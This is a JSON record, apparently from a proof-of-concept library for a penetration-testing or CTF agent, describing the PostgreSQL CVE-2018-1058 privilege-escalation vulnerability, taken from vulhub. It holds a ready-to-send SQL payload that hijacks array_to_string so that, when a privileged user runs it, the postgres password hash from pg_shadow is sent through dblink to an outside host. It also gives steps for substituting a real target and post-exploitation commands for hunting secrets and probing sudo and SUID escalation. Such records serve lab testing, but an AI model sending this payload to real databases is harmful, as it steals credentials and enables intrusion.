{"id": "vulhub:postgres:cve-2018-1058:2", "kind": "poc", "title": "PostgreSQL 提权漏洞（CVE-2018-1058）", "technique": "unknown", "summary": "postgres / CVE-2018-1058。载荷取自上流 README 的复现段落，已按实例值参数化。", "preconditions": ["目标产品为 postgres，且版本落在 CVE-2018-1058 的影响范围内（先确认版本，再发载荷）", "README 中的服务端口需按实际目标替换"], "target_stack": ["postgres", "CVE-2018-1058"], "payload_template": "CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$\n    select dblink_connect((select 'hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres'))); \n    SELECT pg_catalog.array_to_string($1,$2);\n$$ LANGUAGE SQL VOLATILE;", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错、状态码或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认 postgres 版本在 CVE-2018-1058 影响范围内", "把 payload 中的 {{target_url}} / {{host}} 换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先 `printenv | grep -i -e flag -e ctf` —— 进程环境是最快的来源。", "再 `ls -la /` 与 `grep -rIl -e 'CTF{' -e 'flag{' /var/www /tmp /opt 2>/dev/null` —— 文件名常不含 flag。", "全空就判断提权路径（`id`/`sudo -l`/SUID），无路可上就停止并报告，不要重复同一请求。"], "provenance": {"source_type": "reference-corpus", "source_ref": "vulhub", "source_url": "https://github.com/vulhub/vulhub/tree/master/postgres/CVE-2018-1058", "notes": "提取自 postgres/CVE-2018-1058/README.zh-cn.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
